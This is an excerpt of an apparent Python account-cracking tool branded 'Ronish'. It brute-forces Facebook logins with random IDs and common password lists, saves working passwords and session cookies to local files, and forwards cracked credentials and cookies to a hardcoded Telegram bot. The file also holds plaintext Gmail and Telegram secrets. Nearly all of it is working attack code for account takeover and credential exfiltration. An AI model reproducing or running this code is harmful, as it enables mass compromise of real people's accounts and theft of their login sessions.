...
try:
	...
	os.system('xdg-open https://chat.whatsapp.com/sex')
	exit()
oks,cps,loop,apk=[],[],0,[]
myid=uuid.uuid4().hex[:5].upper()
from email.message import EmailMessage
import ssl,smtplib
email_sender = 'RonishSubscription1@gmail.com'
email_password = 'jxgjlutwxmxclkgc'
email_receiver = 'RonishSubscription2@gmail.com'
...
os.system('clear')
print('         \x1b[38;5;46m Never compare me with others          ')
...
def Elite(id,ps,coki):
    try:
        import requests
        token = "6928045822:AAF3B_YAUlU3cZcJDkxwW_HGR8MRwV9YVAo"#Add yout token 
        chatid = "6427525936"#Add your Chat Id
...
▒█▄▄▀ █░░█ █░░█ ▀█▀ ▀▀█ █▀▀█ 
▒█░▒█ ▀▀▀▀ ▀░░▀ ▀▀▀ ▀▀▀ ▀░░▀ V.30.1
\033[1;35m───────────────────Never try to compare .Beyond your imagination hahaa mfs

\033[1;37mTOOL STATUS\033[1;37m : \033[1;33mFREE FOR 20 DAYS
\033[1;37mGITHUB\033[1;37m : \033[1;33mRonishxtha10
\033[1;37mFACEBOOK.COM\033[1;37m:\033[1;33mRonish shrestha
	
	\x1b[1;97mToday DATE : \x1b[1;97m{ha}\x1b[1;97m/\x1b[1;97m{bu}\x1b[1;97m/\x1b[1;97m{ta} 
...
def menu():
			...
			if xd in ['1','01']:
				...
				try:
					...
					ps_limit =1
				clear()
				print('\033[ exp: first last,firstlast,first123')
				linex()
...
def pak():
		...
		mthd = input(' \033[1;97mChoose: ')
		clear()
		print('\033[1;32m [1] \033[mPak Cloning \n\033[1;32m [2] \033[mAfg Cloning \n\033[1;32m [3] \033[mBD  Cloning \033[1;32m \n [4] \033[mInd Cloning \n\033[1;32m ')
		linex()
		pcs = input(' \033[1;97m[?] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as Ronish:	
			linex()
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if pcs in ['2','02']:
					...
					passlist = [psx,ids,'57575751','57273200','i love you','iloveyou','59039200','708090']
				if mthd in ['1','01']:
					Ronish.submit(Ronish1,ids,passlist)
				if mthd in ['2','02']:
					Ronish.submit(Ronish2,ids,passlist)
				if mthd in ['3','03']:
					Ronish.submit(Ronish3,ids,passlist)
				if mthd in ['4','04']:
					Ronish.submit(Ronish4,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
	...
	clear()
	print('\033[1;37m example: Ronish, ali, sajjad, faizan\033[1;37m')
	linex()
	...
	with tred(max_workers=30) as XD:
		...
		for user in fo:
			...
			XD.submit(Ronish1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [Ronish-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Ronish-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/Ronish-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/Ronish-OK.txt','a').write(ids+'|'+pas+'\n')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Ronish-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [Ronish-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Ronish-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/Ronish-CP.txt','a').write(ids+'|'+pas+'\n')
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Ronish-OK] '+ids+' | '+pas+'\033[1;97m')
                                        q = po
                                        powerRonish = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Ronishramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Ronishramxan};{powerRonish}"
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/Ronish-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/Ronish-OK.txt','a').write(ids+'|'+pas+'\n')
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Ronish-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api4(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [HÁMZA-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		for pw in passlist:
			...
			if "checkpoint" in str(ses.cookies.get_dict()):
				print('\r\r\033[1;91m [Ronish-CP] '+ids+' | '+pas)
				open('/sdcard/Ronish-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('\r\r\033[1;92m [Ronish-OK] '+ids+' | '+pas+'\033[1;37m')
				open('/sdcard/Ronish-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
				open('/sdcard/Ronish-OK.txt','a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def Ronish1(ids,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Ronish] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			ua = random.choice(ugen)
	...
	for pas in passlist:
		try:
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if uid in str(oks):
					break
				print('\r\r\033[1;32m [Ronish-OK] '+uid+' | '+pas+'\033[1;37m')
				
				Elite(sid,ps,ckkk)
				oks.append(uid)
				open('/sdcard/Ronish-R-OK.txt','a').write(uid+'|'+pas+'\n')
				break
				...
				try:
					...
					ids = ids
				open('/sdcard/Ronish-R-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:continue
		except (requests.exceptions.ConnectionError):
			time.sleep(5)
			Ronish1(ids,passlist)
		except Exception as e:pass
	loop+=1
os.system("clear")
...
def make_get_request(url):
    try:
        requests.get('https://github.com/Ronish-GHANIZADA')
    except requests.exceptions.ConnectionError:
